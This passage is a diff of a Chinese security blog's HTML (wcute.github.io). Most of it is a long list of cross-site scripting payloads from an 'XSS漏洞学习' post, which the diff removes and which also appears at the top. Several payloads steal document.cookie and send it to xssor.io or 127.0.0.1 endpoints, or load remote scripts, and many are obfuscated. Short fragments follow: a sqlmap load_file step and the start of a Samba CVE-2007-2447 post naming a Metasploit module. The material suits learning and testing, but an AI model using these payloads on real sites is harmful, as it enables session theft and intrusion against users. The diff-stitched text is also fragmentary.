src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1))//&quot;&gt;</span><br><span class="line">&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0</span><br><span class="line">&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=alert(1)//&apos;&gt;</span><br><span class="line"></span><br><span class="line">[!] special tags parsing issues, from: http://html5sec.org/#html</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">[!] fuzzing tips: </span><br><span class="line">&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:alert(1)&gt;XXX&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">[!] utf-7 bom</span><br><span class="line">+/v8</span><br><span class="line">+/v9</span><br><span class="line">+/v+</span><br><span class="line">+/v/</span><br><span class="line"></span><br><span class="line">[!] html5sec.org</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/button&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&amp;nvgt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;frameset onload=alert(1)&gt;</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;title&gt;&lt;img src=&quot;&lt;/title&gt;&lt;img src=x onerror=alert(1)//&quot;&gt; // by evilcos</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;frameset onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;body onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`-alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`+alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`%alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`==alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`*=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line"></span><br><span class="line">&lt;img/src==&quot;x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;div/style==&quot;x onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=behavior:url(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=x:x(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line"></span><br><span class="line">&lt;div&gt; &lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;base href=&quot;javascript:\ &lt;/div&gt;&lt;div id=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:/&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:\&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base/href=javascript:/&gt;&lt;a href=/*&apos;&quot;+-/%~.,()^&amp;$#@!*/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;noembed&gt;&lt;img src=&quot;&lt;/noembed&gt;&lt;iframe onload=alert(1)&gt;&quot; /&gt;&lt;/noembed&gt;</span><br></pre></td></tr></table></figure>
 
           
         
@@ -845,166 +1182,6 @@ with request.urlopen(&apos;https://www.baidu.com&apos;) as f:
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/XSS漏洞学习/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="鸡翅儿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/XSS漏洞学习/" itemprop="url">XSS漏洞学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞学习/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="XSS漏洞的原理"><a href="#XSS漏洞的原理" class="headerlink" title="XSS漏洞的原理"></a>XSS漏洞的原理</h4><p>XSS漏洞是发生在目标网站中目标用户的浏览层面上，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就会发生。</p>
-<h4 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h4><ul>
-<li>获取用户或者管理员的Cookie</li>
-<li>XSS蠕虫</li>
-<li>钓鱼攻击</li>
-<li>挂马</li>
-<li>键盘记录等</li>
-</ul>
-<h4 id="以下是可能嵌入跨源的资源的一些示例："><a href="#以下是可能嵌入跨源的资源的一些示例：" class="headerlink" title="以下是可能嵌入跨源的资源的一些示例："></a>以下是可能嵌入跨源的资源的一些示例：</h4><ul>
-<li><script src="..."></script> 标签嵌入跨域脚本。语法错误信息只能在同浪脚本中捕</li>
-<li>&lt;link rel=”stylesheet” href＝”…”＞标签嵌入CSS。由于CSS的松散的语法规<br>则，CSS的跨域需要一个设置正确的 Content－Type消息头。不同浏览器有不同的限<br>制：IE， Firefox， Chrome， Safari（跳至CVE－2010－0051）部分和 Opera</li>
-<li><img>嵌入图片。支持的图片格式包括PNG，JPEG，GlF，BMP，SVG，</li>
-<li><video>和<audio>嵌入多媒体资源。</audio></video></li>
-<li><object>，<embed>和<applet>的插件</applet></object></li>
-<li>@font-face引入的字体。一些浏览器允许跨域字体（ cross－origin fonts），一些需要同<br>源字体（ same－origin fonts）</li>
-<li><frame>和<iframe>载入的任何资源。站点可以使用 X-frame-optionsi消息头来阻止这<br>种形式的跨域交互。</iframe></li>
-</ul>
-<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，而是为关联应用程序而使用的。如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript: 我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript: 后面的代码当JavaScript来执行，并将结果值返回给当前页面。（XSS Changes Stage #8）</p>
-<h4 id="XSS-常用-payload"><a href="#XSS-常用-payload" class="headerlink" title="XSS 常用 payload"></a>XSS 常用 payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">&gt;&quot;&apos;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;(alert(1))&#125;</span><br><span class="line">`&gt;&lt;script&gt;alert(0)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;</span><br><span class="line">&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;HI&lt;/code&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://xssor.io/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;script&gt;location.href=&apos;http://127.0.0.1:8088/cookie.php?cookie=&apos;+escape(document.cookie);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&apos;&quot;&gt;&lt;img onerror=alert(0) src=&gt;&lt;&quot;&apos;</span><br><span class="line">&lt;img src=http://127.0.0.1/myspace.asp&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:al&amp;#13;ert(0)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=document.createElement(&apos;script&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;document.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScript(i)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=docu&amp;#13;ment.createElement(&apos;\u0053\u0043\u0052\u0049\u0050\u0054&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;doc&amp;#13;ument.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScri&amp;#13;pt(i)&gt;</span><br><span class="line">new Image().src=&quot;http://xssor.io/phishing/cookie.asp?cookie=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body background=javascript:alert(/xss/)&gt;&lt;/body&gt;</span><br><span class="line">body&#123;xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))&#125;</span><br><span class="line">&lt;style&gt;body&#123;width:ｅxpression(parent.document.write(unescape(&apos;%3Cscript%20src%3Dhttp%3A//xssor.io/phishing/%3E%3C/script%3E&apos;)));&#125;&lt;/style&gt;</span><br><span class="line">a&#123;xxx:expression(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&#125;</span><br><span class="line">a&#123;xxx:\65\78\70\72\65\73\73\69\6f\6e\28\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\27\78\73\73\27\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\3b\7d\29&#125;</span><br><span class="line">body&#123;background:url(&quot;javascript:alert(&apos;xss&apos;)&quot;)&#125;</span><br><span class="line">body&#123;background:url(JavAs	cr	</span><br><span class="line">ipt:alert(0))&#125;</span><br><span class="line">&lt;style&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;xss&quot;)&apos;;&lt;/style&gt;</span><br><span class="line">@i\6d\70o\72\74&apos;javascr\ipt:alert(document.cookie)&apos;;</span><br><span class="line">&lt;div style=xss:expres&amp;#92sion(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">alert(String(/xss/).substr(1,3))</span><br><span class="line">alert(/xss/.source)</span><br><span class="line">&lt;a onclick=&quot;i=createElement(&apos;iframe&apos;);i.src=&apos;javascript:alert(/xss/)&apos;;x=parentNode;x.appendChild(i);&quot; href=&quot;#&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">x=&apos;\x61\x6c\x65\x72\x74\x28\x31\x29&apos;;new Function(x)()</span><br><span class="line">&lt;a href=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval(&apos;x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getElementById(x(105,110,106,101,99,116)).appendChild(scr);window.r=1;&apos;):1);&quot;id=&quot;inject&quot;&gt;</span><br><span class="line"></span><br><span class="line">javascript:document.scripts[0].src=&apos;http://127.0.0.1/yy.js&apos;;void(0);</span><br><span class="line">&lt;a href=&quot;javascript:x=open(&apos;http://www.xiaonei.com/&apos;);setInterval (function()&#123;try&#123;x.frames[0].location=&#123;toString:function()&#123;return%20&apos;http://xssor.io/Project/poc/docshell.html&apos;;&#125;&#125;&#125;catch(e)&#123;&#125;&#125;,3000);void(1);&quot;&gt;Test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script/onreadystatechange=alert(1)&gt;</span><br><span class="line">&lt;script/src=data:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,alert(4)&gt;&lt;/script&gt;</span><br><span class="line">javascript:document.cookie=window.prompt(&quot;edit cookie:&quot;,document.cookie);void(0);</span><br><span class="line">&lt;input id=11 name=s value=`aa`onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;input value:aa/onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;li style=list-style:url() onerror=alert(1)&gt;</span><br><span class="line">&lt;div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)&gt;&lt;/div&gt;</span><br><span class="line">&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;</span><br><span class="line">&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">[!] ie only:</span><br><span class="line">&lt;div style=width:1px;filter:glow onfilterchange=alert(1)&gt;x</span><br><span class="line">&lt;title onpropertychange=alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;</span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; &lt;!--[if&lt;img src=x onerror=alert(1)//]&gt; --&gt;</span><br><span class="line"></span><br><span class="line">[!] parsing error:</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;comment&gt;&lt;img src=&quot;&lt;/comment&gt;&lt;img src=x onerror=alert(1))//&quot;&gt;</span><br><span class="line">&lt;![&gt;&lt;img src=&quot;]&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0</span><br><span class="line">&lt;x &apos;=&quot;foo&quot;&gt;&lt;x foo=&apos;&gt;&lt;img src=x onerror=alert(1)//&apos;&gt;</span><br><span class="line"></span><br><span class="line">[!] special tags parsing issues, from: http://html5sec.org/#html</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;/ foo=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;? foo=&quot;&gt;&lt;x foo=&apos;?&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;! foo=&quot;[[[Inception]]&quot;&gt;&lt;x foo=&quot;]foo&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;% foo&gt;&lt;x foo=&quot;%&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">[!] fuzzing tips: </span><br><span class="line">&lt;img[a][b][c]src[d]=x[e]onerror=[f]&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:alert(1)&gt;XXX&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">[!] utf-7 bom</span><br><span class="line">+/v8</span><br><span class="line">+/v9</span><br><span class="line">+/v+</span><br><span class="line">+/v/</span><br><span class="line"></span><br><span class="line">[!] html5sec.org</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;form id=&quot;test&quot;&gt;&lt;/form&gt;&lt;button form=&quot;test&quot; formaction=&quot;javascript:alert(1)&quot;&gt;X&lt;/button&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&amp;nvgt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;frameset onload=alert(1)&gt;</span><br><span class="line">&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;style&gt;&lt;img src=&quot;&lt;/style&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;title&gt;&lt;img src=&quot;&lt;/title&gt;&lt;img src=x onerror=alert(1)//&quot;&gt; // by evilcos</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;frameset onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;body onpageshow=&quot;alert(1)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`-alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`+alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`%alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`==alert(123)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`/=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line">&lt;script&gt;`&lt;/div&gt;&lt;div&gt;`*=alert(123)&lt;/script&gt; # Only Edge</span><br><span class="line"></span><br><span class="line">&lt;img/src==&quot;x onerror=alert(1)//&quot;&gt;</span><br><span class="line">&lt;div/style==&quot;x onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=behavior:url(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line">&lt;div style=x:x(&quot; onclick=alert(1)//&quot;&gt;XSS&apos;OR</span><br><span class="line"></span><br><span class="line">&lt;div&gt; &lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;base href=&quot;javascript:\ &lt;/div&gt;&lt;div id=&quot;x&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:/&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base href=&quot;javascript:\&quot;&gt;&lt;a href=/**/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">&lt;div&gt;&lt;base/href=javascript:/&gt;&lt;a href=/*&apos;&quot;+-/%~.,()^&amp;$#@!*/alert(1)&gt;XSS&lt;/a&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;noembed&gt;&lt;img src=&quot;&lt;/noembed&gt;&lt;iframe onload=alert(1)&gt;&quot; /&gt;&lt;/noembed&gt;</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/渗透测试前期---信息搜集/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1233,6 +1410,198 @@ Nmap 扫描 -sV 参数对其服务版本进行识别
 9. 短文件利用
 10. sqlmap --sql-shell load_file(&apos;&apos;);
 </code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Samba远程Shell命令注入执行漏洞（CVE-2007-2447）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="鸡翅儿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/Samba远程Shell命令注入执行漏洞（CVE-2007-2447）/" itemprop="url">Samba远程Shell命令注入执行漏洞（CVE-2007-2447）</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T12:33:03+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>usermap_script：CVE-2007-2447<br>Samba用户名映射脚本命令执行</p>
+<h4 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h4><p>传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh，在smb.conf中，导致允许远程命令执行。</p>
+<h4 id="msf-中模块位置"><a href="#msf-中模块位置" class="headerlink" title="msf 中模块位置"></a>msf 中模块位置</h4><blockquote>
+<p>exploit/multi/samba/usermap_script</p>
+</blockquote>
